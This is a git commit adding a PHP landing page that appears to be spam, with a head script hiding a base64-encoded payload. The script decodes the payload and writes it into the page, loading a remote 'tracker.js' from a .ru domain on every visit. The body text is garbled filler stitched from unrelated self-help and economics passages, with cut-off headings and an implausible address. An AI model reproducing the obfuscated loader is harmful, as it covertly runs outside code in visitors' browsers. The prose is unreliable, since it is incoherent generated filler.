e55fb9b0ca387ac6903e1270712065d4b9887d85
nslsodez <78701166+nslsodez@users.noreply.github.com>
2021-02-07 21:06:17 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Do you see the difference? This is a clean courtyard.  The offer will be absolutely </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xOTZjbzFvb293eWs5bmZsam8iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="eb4dzl6l16nwgwck7">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="hniy8pnvmealdtg5q">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Do you see the difference? This is a clean courtyard.  The offer will be absolutely </h1>
+	</section>
+
+
+	<section class="our-work" class="pj40ikz8di47ewrwr4j06">
+		<h3 class="title">Industrial units may be of the same cost, but one m</h3>
+		<p>Pay first, receive later.  I realized that I did not listen to you properly.But I want to change that.  Therefore, I recommend reading books such as Anwar Sadat's inspiring biography In Search of Myself, and watching films such as Chariots of Fire, or plays such as Les Miserables [30], which open up before you Win / Win model.  It can be caused by: - ​​oligopolistic pricing practice; - economic policy of the state; - rising prices for raw materials, etc.Cost inflation is characterized by the impact of the following non-monetary factors on the pricing processes: - leadership in prices; - a decrease in the growth of labor productivity and a drop in production; - the increased importance of the service sector.  It worried us very much.  When applied to an organization, the physical dimension is expressed in economic terms.  Mutual understanding and agreement in all five areas creates a standard against which people can measure their own success.  Of course, commercial production also has its drawbacks.  When a person has the opportunity to use both the intuitive, creative, figurative right hemisphere, and the analytical, logical, verbal left, then we can say that the whole brain is working.  An offer is formed depending on the factors of market development.  40.  It includes mutual learning, mutual influence and mutual benefit.  In time management jargon, this is called the Pareto Principle: 80 percent of results come from 20 percent of effort.  However, the first creation is not always the result of a conscious plan. </p>
+		<hr>
+
+		<ul class="grid" class="ewjchc2mfvldpnyz8cjt">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="eb4dzl6l16nwgwck7">
+		<h3 class="title">We call such a choice an error, and this i</h3>
+		<p>However, the Hollywood script is not an objective description of reality.  What are you striving for in each of these roles? What is important to you? Think about your roles in areas such as politics, community service, charities.  A creative, imaginative right hemisphere is one of the most important resources you need to create and realize your Personal Mission.  Perhaps there have been moments in your life when there was a person next to you who believed in you, while you did not believe in yourself.  The disadvantage of the accounting method is that it includes the costs of only those resources that the company acquires from the outside (raw materials).  Mission statements shape the way of thinking, become the basis for family management.  The Sufficiency Mentality, on the other hand, stems from a deep inner sense of self-worth and self-confidence.  - All right, dad, I'm tired! Who needs this school! - You feel very disappointed with the school.  However, entertainment by itself does not bring deep, lasting satisfaction and a sense of fullness of life. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hniy8pnvmealdtg5q" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pj40ikz8di47ewrwr4j06">
+		<h3 class="title">The degree of mastery of this technique - the tip of the iceber</h3>
+		<p>Two weeks and two words.  A deal is a commercial exchange of value between two parties.  Your behavior directly depends on your character, that is, on the factwhat you really are - not from what others say about you or how you want to appear in my eyes.  I sincerely encourage you to open the gates of change and develop as you learn these skills.  Gordon squatted down and wrote a few words with a piece of a shell;then he turned and walked away.  Subsidies, on the other hand, are considered to be a “reverse tax”.  I am also grateful to my students, friends and colleagues at Brigham Young University and Covey Leadership Center.  We live in a world that offers a huge amount of entertainment and pleasure and which encourages us to do so.  The results were stunning. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ewjchc2mfvldpnyz8cjt" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="eb4dzl6l16nwgwck7">
+		<h3 class="title">Your planning tool should be your servant, not your</h3>
+		<p>- I still haven't come to my senses.  Maybe it's Win / Lose? How does this scenario affect your interactions with other people? Can you identify the main source of this script? Determine if this scenario serves you well or badly in your real life.  The function of money as a means of payment.  Raw materials, energy, hourly wages are examples of variable costs for most firms.  The concept of perfect competition is tied to a static equilibrium model operating with predetermined prices and volumes of resources.  In an effort to protect themselves from this, they cut themselves off from synergy.  Take another look at the essence of these questions: name one thing that you could do in your personal and professional life and what,if done regularly, it would make a huge positive difference.  Only when you have the self-awareness needed to evaluate your old program, and the imagination and conscience to create a new, unique, principles-based program that you can say yes to, only then will you have the willpower to genuinely smile to say "no" to what is not important.  In order to smooth out the negative consequences of non-payments, the company was given the right to create a reserve for doubtful payments.  For example,higher wages and relatively low prices for machinery can cause a decrease in the demand for labor and an increase in it for machines that replace labor, and vice versa.  Figure: 1.  We can make a promise and keep it. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hniy8pnvmealdtg5q" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pj40ikz8di47ewrwr4j06">
+		<h3 class="title">But if you apply it in isolation, as a sep</h3>
+		<p>- Wonderful! Do you do what you want to doAnd then he began to literally interrogate her.  The modern market is largely an oligopolistic market.  Inflation means not only a decrease in the purchasing power of money, it undermines the possibilities of economic regulation, nullifies efforts to restore disturbed proportions and structural transformations.  or inefficiency.  In fact, all women I know suffer from this.  They completed the program in three and a half weeks! The paradigm shift in the organization of learning has released incredible motivating creative energy. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="ewjchc2mfvldpnyz8cjt" class="title">If you are focused on your work, you are probably thinking abou</h3>	
+		<p>The emergence of shuttle traders was facilitated by the following prerequisites: - demand for imported goods; - low transaction costs for products imported by small firms and shuttles; - the presence in the Russian market of a huge layer of middle-income and low-income people, who later became regular clients of the shuttle traders.Small business problems in the field of taxation.  Once, when I was working with a client, the president of a large retail chain, he said to me: - Look, Stephen, the Win / Win idea sounds tempting.but it is too idealistic.  However, the regulatory role of the market continues to persist, largely determining the balance of the economy.  If our sense of personal security depends on our inner sources, then we have the power to apply the skills of Personal Victory.  The main feature of a monopoly formation (monopoly) is the occupation of a monopoly position.  People often find that the victories they aspired to were just soap bubbles, and the success came at the expense of what they suddenly realized was more important.  It stimulates an increase in production volumes, since with an increase in the volume of products sold, the mass of profits also increases.  With a significant Emotional Banking Account, spouses trust each other and maintain an honest relationship.  Part three.  But if you don't know yourself, if you don't control yourself,if you are not able to control yourself, then it is very difficult for you to respect yourself. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="eb4dzl6l16nwgwck7">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="hniy8pnvmealdtg5q"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="pj40ikz8di47ewrwr4j06"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="ewjchc2mfvldpnyz8cjt"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>2730 Zboncak Ports, Suite 724, 83634, East Romainemouth, Illinois, United States</p>
+		<p>Phone number: +7(890)079-82701</p>
+	</footer>
+
+</body>
+
+</html>
